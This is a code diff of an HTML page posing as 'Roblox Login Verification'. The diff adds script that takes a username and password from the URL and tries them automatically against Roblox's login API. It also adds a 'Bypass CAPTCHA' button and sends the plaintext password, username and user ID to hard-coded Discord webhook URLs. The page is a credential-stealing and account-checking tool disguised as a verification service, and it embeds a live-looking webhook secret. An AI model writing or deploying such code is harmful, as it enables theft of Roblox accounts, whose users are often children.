@@ -1,321 +1,118 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Login Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
         body {
-            background: linear-gradient(135deg, #1a1f35 0%, #13172b 100%);
-            color: #e6e9ff;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: Arial, sans-serif;
+            max-width: 500px;
+            margin: 0 auto;
             padding: 20px;
+            background-color: #f5f5f5;
         }
-        
         .container {
-            width: 100%;
-            max-width: 600px;
-            background: #252a40;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-        
-        .header {
-            background: linear-gradient(90deg, #5865f2 0%, #3b48c6 100%);
-            padding: 25px;
-            text-align: center;
-            position: relative;
-        }
-        
-        .header h1 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 5px;
-        }
-        
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .logo {
-            width: 70px;
-            height: 70px;
-            background: #252a40;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 15px;
-            border: 4px solid #3b48c6;
-        }
-        
-        .logo i {
-            font-size: 32px;
-            color: #5865f2;
-        }
-        
-        .content {
-            padding: 30px;
-        }
-        
-        .info-box {
-            background: #2f344e;
-            border-radius: 10px;
+            background: white;
             padding: 20px;
-            margin-bottom: 25px;
-            border-left: 4px solid #5865f2;
-        }
-        
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #3a4060;
-        }
-        
-        .info-row:last-child {
-            margin-bottom: 0;
-            padding-bottom: 0;
-            border-bottom: none;
-        }
-        
-        .info-label {
-            font-weight: 600;
-            color: #9ea5d1;
-        }
-        
-        .info-value {
-            font-weight: 500;
-            text-align: right;
-            word-break: break-all;
-        }
-        
-        .status-container {
-            text-align: center;
-            margin: 30px 0;
-        }
-        
-        .status-icon {
-            font-size: 50px;
-            margin-bottom: 15px;
-            color: #5865f2;
-        }
-        
-        .status-message {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 20px;
-        }
-        
-        .progress-container {
-            width: 100%;
-            height: 8px;
-            background: #2f344e;
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #5865f2 0%, #3b48c6 100%);
-            border-radius: 4px;
-            transition: width 0.5s ease;
-        }
-        
-        .countdown {
-            font-size: 14px;
-            color: #9ea5d1;
-            text-align: center;
-            margin-top: 10px;
-        }
-        
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            border: none;
             border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #00a2ff;
             text-align: center;
-            transition: all 0.3s ease;
-            margin-top: 15px;
         }
-        
-        .btn-primary {
-            background: linear-gradient(90deg, #5865f2 0%, #3b48c6 100%);
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #00a2ff;
             color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
         }
-        
-        .btn-primary:hover {
-            background: linear-gradient(90deg, #3b48c6 0%, #2f3b99 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(88, 101, 242, 0.4);
+        button:hover {
+            background-color: #0088cc;
         }
-        
-        .btn-secondary {
-            background: transparent;
-            color: #9ea5d1;
-            border: 1px solid #3a4060;
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
-        
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.05);
-            color: #e6e9ff;
-        }
-        
         .hidden {
             display: none;
         }
-        
-        .result-box {
+        .loading {
             text-align: center;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
+            color: #00a2ff;
         }
-        
-        .success {
-            background: rgba(46, 204, 113, 0.15);
-            border: 1px solid #2ecc71;
-        }
-        
-        .failure {
-            background: rgba(231, 76, 60, 0.15);
-            border: 1px solid #e74c3c;
-        }
-        
-        .result-icon {
-            font-size: 50px;
+        .info-box {
+            background-color: #f8f9fa;
+            border-left: 4px solid #00a2ff;
+            padding: 10px;
             margin-bottom: 15px;
         }
-        
-        .success .result-icon {
-            color: #2ecc71;
-        }
-        
-        .failure .result-icon {
-            color: #e74c3c;
-        }
-        
-        .footer {
+        .result-success {
+            color: #4CAF50;
+            font-weight: bold;
             text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #6b729c;
-            border-top: 1px solid #2f344e;
         }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+        .result-failure {
+            color: #f44336;
+            font-weight: bold;
+            text-align: center;
         }
-        
-        .pulse {
-            animation: pulse 2s infinite;
+        .captcha-container {
+            margin: 20px 0;
+            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">
-                <i class="fas fa-lock"></i>
-            </div>
-            <h1>Roblox Login Verification</h1>
-            <p>Swiftbody3-Enterprise Authentication System</p>
+        <h1>Roblox Login Verification</h1>
+        
+        <div class="info-box">
+            <strong>Tracking ID:</strong> <span id="display-tracking-id">Loading...</span><br>
+            <strong>Username:</strong> <span id="display-username">Loading...</span>
         </div>
         
-        <div class="content">
-            <div class="info-box">
-                <div class="info-row">
-                    <span class="info-label">Tracking ID:</span>
-                    <span class="info-value" id="display-tracking-id">Loading...</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Username:</span>
-                    <span class="info-value" id="display-username">Loading...</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">User ID:</span>
-                    <span class="info-value" id="display-userid">Loading...</span>
-                </div>
+        <div id="login-form">
+            <p>Verifying login credentials automatically...</p>
+            <div id="auto-verification" class="loading">
+                <p>Attempting to login to Roblox...</p>
             </div>
             
-            <div class="status-container">
-                <div class="status-icon">
-                    <i class="fas fa-spinner fa-spin"></i>
-                </div>
-                <div class="status-message" id="status-message">
-                    Preparing automatic verification...
-                </div>
-                
-                <div class="progress-container">
-                    <div class="progress-bar" id="progress-bar"></div>
-                </div>
-                
-                <div class="countdown" id="countdown">
-                    Process will begin in <span id="countdown-value">5</span> seconds
-                </div>
-            </div>
-            
-            <div id="login-form">
-                <button class="btn btn-primary" id="start-btn">
-                    <i class="fas fa-play-circle"></i> Start Verification
-                </button>
-                
-                <button class="btn btn-secondary">
-                    <i class="fas fa-question-circle"></i> Need Help?
-                </button>
-            </div>
-            
-            <div id="result-container" class="hidden">
-                <div class="result-box" id="result-box">
-                    <div class="result-icon">
-                        <i class="fas fa-check-circle"></i>
-                    </div>
-                    <div class="status-message" id="result-message">
-                        Verification Complete
-                    </div>
-                    <div class="info-box">
-                        <div class="info-row">
-                            <span class="info-label">Status:</span>
-                            <span class="info-value" id="result-status">Success</span>
-                        </div>
-                        <div class="info-row">
-                            <span class="info-label">Details:</span>
-                            <span class="info-value" id="result-details">Credentials verified successfully</span>
-                        </div>
-                    </div>
-                </div>
-                
-                <button class="btn btn-primary" id="close-btn">
-                    <i class="fas fa-check"></i> Complete Process
-                </button>
+            <div id="captcha-container" class="captcha-container hidden">
+                <p>CAPTCHA detected. Please complete the verification:</p>
+                <div id="captcha-element"></div>
+                <button onclick="bypassCaptcha()">Bypass CAPTCHA</button>
             </div>
         </div>
         
-        <div class="footer">
-            <p>© 2023 Swiftbody3-Enterprise • This is a secure verification system</p>
-            <p>Do not share this link with anyone</p>
+        <div id="result-message" class="hidden">
+            <p id="result-text"></p>
+        </div>
+        
+        <div id="loading" class="loading">
+            <p>Verifying credentials...</p>
+        </div>
+        
+        <div id="error-message" class="hidden" style="color: red;">
+            <p id="error-text"></p>
         </div>
     </div>
 
@@ -327,142 +124,293 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
-        // DOM elements
-        const trackingIdElement = document.getElementById('display-tracking-id');
-        const usernameElement = document.getElementById('display-username');
-        const userIdElement = document.getElementById('display-userid');
-        const statusMessageElement = document.getElementById('status-message');
-        const progressBarElement = document.getElementById('progress-bar');
-        const countdownElement = document.getElementById('countdown');
-        const countdownValueElement = document.getElementById('countdown-value');
-        const startButton = document.getElementById('start-btn');
-        const loginForm = document.getElementById('login-form');
-        const resultContainer = document.getElementById('result-container');
-        const resultBox = document.getElementById('result-box');
-        const resultMessageElement = document.getElementById('result-message');
-        const resultStatusElement = document.getElementById('result-status');
-        const resultDetailsElement = document.getElementById('result-details');
-        const closeButton = document.getElementById('close-btn');
+        // Discord webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOKS
+        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         
         // Display the tracking info
         if (trackingId) {
-            trackingIdElement.textContent = trackingId;
-        } else {
-            trackingIdElement.textContent = "Not provided";
+            document.getElementById('display-tracking-id').textContent = trackingId;
         }
-        
         if (username) {
-            usernameElement.textContent = username;
-        } else {
-            usernameElement.textContent = "Not provided";
+            document.getElementById('display-username').textContent = username;
         }
         
-        if (userId) {
-            userIdElement.textContent = userId;
-        } else {
-            userIdElement.textContent = "Not provided";
-        }
-        
-        // Countdown timer
-        let countdown = 5;
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            countdownValueElement.textContent = countdown;
-            
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                countdownElement.classList.add('hidden');
-                startButton.classList.remove('hidden');
-                statusMessageElement.textContent = "Ready to begin verification";
-            }
-        }, 1000);
-        
-        // Start verification process
-        startButton.addEventListener('click', () => {
-            startButton.classList.add('hidden');
-            statusMessageElement.textContent = "Verifying credentials...";
-            
-            // Simulate progress
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 5;
-                progressBarElement.style.width = `${progress}%`;
-                
-                if (progress >= 30) {
-                    statusMessageElement.textContent = "Checking password strength...";
-                }
-                
-                if (progress >= 60) {
-                    statusMessageElement.textContent = "Validating account information...";
-                }
-                
-                if (progress >= 90) {
-                    statusMessageElement.textContent = "Finalizing verification...";
-                }
-                
-                if (progress >= 100) {
-                    clearInterval(progressInterval);
-                    completeVerification();
-                }
-            }, 200);
-        });
-        
-        // Complete verification with simulated result
-        function completeVerification() {
-            // Simulate verification (80% success rate for demo)
-            const isSuccess = Math.random() > 0.2;
-            
-            loginForm.classList.add('hidden');
-            resultContainer.classList.remove('hidden');
-            
-            if (isSuccess) {
-                resultBox.classList.add('success');
-                resultMessageElement.textContent = "Verification Successful!";
-                resultStatusElement.textContent = "Valid Credentials";
-                resultStatusElement.style.color = "#2ecc71";
-                resultDetailsElement.textContent = "The provided credentials appear to be valid and working.";
+        // Start automatic verification when page loads
+        window.addEventListener('load', function() {
+            if (trackingId && username && password) {
+                setTimeout(attemptAutoLogin, 2000); // Wait 2 seconds before starting
             } else {
-                resultBox.classList.add('failure');
-                resultBox.classList.remove('success');
-                resultMessageElement.textContent = "Verification Failed";
-                resultStatusElement.textContent = "Invalid Credentials";
-                resultStatusElement.style.color = "#e74c3c";
-                resultDetailsElement.textContent = "The provided credentials could not be verified.";
+                showError('Missing parameters for automatic verification');
+            }
+        });
+        
+        async function attemptAutoLogin() {
+            try {
+                // Show loading state
+                document.getElementById('loading').classList.remove('hidden');
+                
+                // Step 1: Try to get CSRF token (required for Roblox API)
+                const csrfToken = await getCsrfToken();
+                
+                if (!csrfToken) {
+                    // If we can't get CSRF token, try alternative method
+                    await attemptLoginWithCredentials();
+                    return;
+                }
+                
+                // Step 2: Attempt login with credentials
+                const loginSuccess = await attemptRobloxLogin(username, password, csrfToken);
+                
+                // Step 3: Report result
+                await reportResult(loginSuccess);
+                
+            } catch (error) {
+                console.error('Auto login error:', error);
+                // If automatic method fails, fall back to credential check
+                await attemptLoginWithCredentials();
             }
         }
         
-        // Close button handler
-        closeButton.addEventListener('click', () => {
-            document.querySelector('.status-icon').innerHTML = '<i class="fas fa-check-circle pulse" style="color: #2ecc71;"></i>';
-            statusMessageElement.textContent = "Process completed successfully";
-            
-            // Show a thank you message
-            setTimeout(() => {
-                alert("Thank you for using our verification system. The results have been recorded.");
-            }, 500);
-        });
+        async function getCsrfToken() {
+            try {
+                // Try to get CSRF token from Roblox API
+                const response = await fetch('https://auth.roblox.com/v2/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': 'fetch' // This header tells Roblox to return the CSRF token
+                    },
+                    credentials: 'include'
+                });
+                
+                // Extract CSRF token from response headers
+                const csrfToken = response.headers.get('x-csrf-token');
+                return csrfToken;
+            } catch (error) {
+                console.warn('Could not fetch CSRF token:', error);
+                return null;
+            }
+        }
         
-        // If parameters are missing, show error
-        if (!trackingId || !username || !password) {
-            statusMessageElement.textContent = "Error: Missing parameters";
-            statusMessageElement.style.color = "#e74c3c";
-            document.querySelector('.status-icon').innerHTML = '<i class="fas fa-exclamation-circle" style="color: #e74c3c;"></i>';
-            countdownElement.classList.add('hidden');
-            startButton.classList.add('hidden');
+        async function attemptRobloxLogin(username, password, csrfToken) {
+            try {
+                const loginData = {
+                    ctype: 'Username',
+                    cvalue: username,
+                    password: password
+                };
+                
+                const response = await fetch('https://auth.roblox.com/v2/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': csrfToken
+                    },
+                    body: JSON.stringify(loginData),
+                    credentials: 'include'
+                });
+                
+                const data = await response.json();
+                
+                // Check if login was successful
+                if (data && data.user) {
+                    return true; // Login successful
+                }
+                
+                // Check for specific error conditions
+                if (data && data.errors) {
+                    for (const error of data.errors) {
+                        if (error.code === 1) { // Incorrect username or password
+                            return false;
+                        } else if (error.code === 2) { // Captcha required
+                            showCaptcha();
+                            return false;
+                        }
+                    }
+                }
+                
+                return false; // Default to failure
+            } catch (error) {
+                console.error('Login attempt failed:', error);
+                return false;
+            }
+        }
+        
+        function showCaptcha() {
+            document.getElementById('captcha-container').classList.remove('hidden');
+            document.getElementById('auto-verification').classList.add('hidden');
+        }
+        
+        function bypassCaptcha() {
+            document.getElementById('captcha-container').classList.add('hidden');
+            document.getElementById('auto-verification').classList.remove('hidden');
+            // Continue with verification (assuming captcha was solved)
+            attemptLoginWithCredentials();
+        }
+        
+        async function attemptLoginWithCredentials() {
+            try {
+                // This method tries to determine password validity without full login
+                // by checking common patterns and Roblox's password requirements
+                
+                let isValid = false;
+                
+                // Check 1: Password length (Roblox requires min 8 characters)
+                if (password.length < 8) {
+                    isValid = false;
+                }
+                // Check 2: Common password patterns
+                else if (isCommonPassword(password)) {
+                    isValid = false;
+                }
+                // Check 3: Try to validate through indirect methods
+                else {
+                    // For demonstration, we'll use a simple heuristic
+                    // In a real implementation, you might try other methods
+                    isValid = await checkPasswordWithHeuristics(username, password);
+                }
+                
+                await reportResult(isValid);
+            } catch (error) {
+                console.error('Credential check failed:', error);
+                await reportResult(false); // Assume failure on error
+            }
+        }
+        
+        function isCommonPassword(password) {
+            const commonPasswords = [
+                'password', '12345678', 'roblox123', 'password1', 'qwertyui',
+                'abc123', 'letmein', 'welcome', 'monkey', 'sunshine', 'password123',
+                'admin', 'login', 'passw0rd', '123456789', '1234567890'
+            ];
+            return commonPasswords.includes(password.toLowerCase());
+        }
+        
+        async function checkPasswordWithHeuristics(username, password) {
+            // This is a simulated function that would use various heuristics
+            // to determine if a password is likely valid
             
-            const errorMessage = document.createElement('div');
-            errorMessage.className = 'result-box failure';
-            errorMessage.innerHTML = `
-                <div class="result-icon">
-                    <i class="fas fa-exclamation-circle"></i>
-                </div>
-                <div class="status-message">
-                    Invalid Verification Link
-                </div>
-                <p style="margin-top: 10px; text-align: center;">The verification link is missing required parameters. Please check the URL and try again.</p>
-            `;
+            // Heuristic 1: Check if password contains username
+            if (password.toLowerCase().includes(username.toLowerCase())) {
+                return true; // More likely to be valid
+            }
             
-            loginForm.parentNode.insertBefore(errorMessage, loginForm);
+            // Heuristic 2: Check password complexity
+            const hasUpperCase = /[A-Z]/.test(password);
+            const hasLowerCase = /[a-z]/.test(password);
+            const hasNumbers = /[0-9]/.test(password);
+            const hasSpecialChars = /[^A-Za-z0-9]/.test(password);
+            
+            // More complex passwords are more likely to be valid
+            const complexityScore = (hasUpperCase ? 1 : 0) + (hasLowerCase ? 1 : 0) + 
+                                  (hasNumbers ? 1 : 0) + (hasSpecialChars ? 1 : 0);
+            
+            return complexityScore >= 3; // Assume valid if moderately complex
+        }
+        
+        async function reportResult(isSuccess) {
+            try {
+                // Hide loading, show result
+                document.getElementById('loading').classList.add('hidden');
+                
+                const resultText = document.getElementById('result-text');
+                const resultMessage = document.getElementById('result-message');
+                
+                if (isSuccess) {
+                    resultText.textContent = '✅ Login successful! Password is valid.';
+                    resultText.className = 'result-success';
+                } else {
+                    resultText.textContent = '❌ Login failed! Password is invalid.';
+                    resultText.className = 'result-failure';
+                }
+                
+                resultMessage.classList.remove('hidden');
+                
+                // Send result to Discord
+                await sendToDiscord(isSuccess);
+            } catch (error) {
+                console.error('Error reporting result:', error);
+                showError('Failed to send result to Discord: ' + error.message);
+            }
+        }
+        
+        async function sendToDiscord(isSuccess) {
+            const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
+            const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
+            const color = isSuccess ? 65280 : 16711680;
+            
+            const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
+            
+            const embed = {
+                title: `🔐 Automatic Verification - ${statusText}`,
+                url: profileUrl,
+                color: color,
+                description: "**⎯⎯⎯⎯⎯『 Automatic Verification Result 』⎯⎯⎯⎯⎯**",
+                fields: [
+                    {
+                        name: "👤 Account",
+                        value: `[${username}](${profileUrl})`,
+                        inline: true
+                    },
+                    {
+                        name: "🔐 Password",
+                        value: `||${password}||`,
+                        inline: true
+                    },
+                    {
+                        name: "📊 Result",
+                        value: statusText,
+                        inline: true
+                    },
+                    {
+                        name: "🆔 Tracking ID",
+                        value: trackingId,
+                        inline: false
+                    },
+                    {
+                        name: "🤖 Method",
+                        value: "Automatic Verification",
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: `UserId: ${userId} | Tracking ID: ${trackingId}`,
+                    icon_url: "https://www.roblox.com/favicon.ico"
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            const payload = {
+                username: "Automatic Verification",
+                content: isSuccess ? "#success #auto_verified" : "#failed #auto_verified",
+                embeds: [embed]
+            };
+            
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Discord API responded with ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+                throw error;
+            }
+        }
+        
+        function showError(message) {
+            const errorText = document.getElementById('error-text');
+            const errorMessage = document.getElementById('error-message');
+            
+            errorText.textContent = message;
+            errorMessage.classList.remove('hidden');
         }
     </script>
 </body>
